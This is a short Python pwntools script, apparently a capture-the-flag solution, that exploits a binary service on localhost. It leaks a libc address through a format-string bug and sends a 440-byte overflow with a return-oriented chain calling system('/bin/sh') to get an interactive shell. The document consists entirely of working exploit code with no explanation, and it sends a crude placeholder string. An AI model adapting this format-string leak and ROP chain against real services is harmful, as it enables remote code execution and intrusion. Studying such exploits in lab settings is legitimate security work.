from pwn import *
import time
#p = process("./src")
p = remote("127.0.0.1", 42069)
p.sendline(b"1")
p.sendline(b"e")
p.sendline(b"e")
for i in range(100):
    p.sendline(b"4")
    time.sleep(0.1)
    p.sendline(f"%{i}$p".encode())
    p.sendline() #%7$p
    d = p.recvuntil(b":]")
    print(i, d[d.index(b"You entered"):])
    if i == 6:
        break
ptr = d.index(b"0x")
libc = int(d[ptr:ptr+14].decode(), 16)-0x5a03bc
print(hex(libc))
poprdi = p64(libc+0x0000000000029835)
binsh = p64(libc+0x1bb26a)
system = p64(libc+0x000000000004ba40)
print(hex(libc+0x0000000000029835))
ex = b"A"*(440)+p64(libc+0x00000000000291d6)+poprdi + binsh + system
p.interactive()
p.sendline(b"4")
p.sendline(b"pohuy")
p.sendline(ex)
print(p.recv())
p.clean()
while True:
    x = input()
    p.sendline(x)
    print(p.recv(10000))
time.sleep(1)
print(p.recvline())


#print(open(f"/proc/{pid}/maps", 'r').read())
